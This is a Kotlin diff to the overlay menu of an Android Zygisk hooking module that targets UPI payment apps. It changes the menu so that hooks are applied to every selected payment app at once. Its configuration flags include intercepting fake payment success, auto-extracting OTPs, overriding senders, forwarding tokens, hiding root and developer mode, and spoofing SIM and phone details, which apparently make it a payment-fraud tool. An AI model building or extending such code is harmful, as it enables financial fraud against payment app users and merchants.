@@ -13,6 +13,7 @@ import com.hivirtus.zygiskmode.databinding.OverlayMenuBinding
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 
@@ -95,6 +96,15 @@ class OverlayMenuController(
         val config = configManager.load()
         val adapter = UpiAppListAdapter(UpiAppRegistry.ALL, config.hookedUpiApps)
         upiAppAdapter = adapter
+        adapter.onSelectionChanged = { _ ->
+            if (suppressAutoSave) return@onSelectionChanged
+            updateUpiSelectedCount()
+            scope.launch {
+                delay(500)
+                saveUpiHooks(showToast = false)
+                updateActiveHookLabel()
+            }
+        }
         menu.rvUpiApps.layoutManager = LinearLayoutManager(context)
         menu.rvUpiApps.adapter = adapter
         updateUpiSelectedCount()
@@ -117,7 +127,8 @@ class OverlayMenuController(
             }
             updateUpiSelectedCount()
             if (showToast) {
-                toast(R.string.upi_hooks_saved, Toast.LENGTH_LONG)
+                val count = selection.count { it.value }
+                toast(appContext.getString(R.string.upi_hooks_saved, count), Toast.LENGTH_LONG)
             }
         }
     }
@@ -284,12 +295,14 @@ class OverlayMenuController(
     }
 
     private fun updateActiveHookLabel() {
-        val name = ActiveHookManager.readActiveDisplayName(appContext)
-        val pkg = ActiveHookManager.readActivePackage()
-        menu.tvActiveHook.text = if (pkg.isNullOrBlank()) {
-            appContext.getString(R.string.active_hook_none)
-        } else {
-            appContext.getString(R.string.active_hook_app, name)
+        val count = ActiveHookManager.selectedHookCount(appContext)
+        menu.tvActiveHook.text = when {
+            count == 0 -> appContext.getString(R.string.active_hook_none)
+            count > 1 -> appContext.getString(R.string.active_hook_multi, count)
+            else -> appContext.getString(
+                R.string.active_hook_app,
+                ActiveHookManager.readActiveDisplayName(appContext)
+            )
         }
     }
 
@@ -341,23 +354,18 @@ class OverlayMenuController(
                         overrideIncomingSender = true,
                         interceptFakeSuccess = true,
                         autoExtractOtp = true,
+                        autoHookForeground = menu.switchAutoHook.isChecked,
                         hideRoot = menu.switchNotRoot.isChecked,
                         hideDeveloper = menu.switchNotDeveloper.isChecked,
                         autoForwardToken = menu.switchAutoForward.isChecked,
                         fakeInterceptTelegram = false
                     )
                 )
+                FrameworkHookHelper.markScopeActivePublic()
+                HookEngine.applyAllSelectedHooks(appContext, configManager, selection)
             }
 
-            val hookResult = withContext(Dispatchers.IO) {
-                ActiveHookManager.hookForegroundApp(appContext, configManager)
-            }
-
-            if (!hookResult.success) {
-                toast(hookResult.message, Toast.LENGTH_LONG)
-                menu.tvHookStatus.text = hookResult.message
-                return@launch
-            }
+            val hookedCount = selection.count { it.value }
 
             menu.switchSim1Mock.isChecked = true
             menu.switchPhoneSpoof.isChecked = true
@@ -372,7 +380,7 @@ class OverlayMenuController(
             menu.tvHookStatus.text = appContext.getString(R.string.hook_status_ready)
             updateActiveHookLabel()
             toast(
-                appContext.getString(R.string.start_hook_app_success, hookResult.displayName),
+                appContext.getString(R.string.start_hook_all_success, hookedCount),
                 Toast.LENGTH_LONG
             )
         }
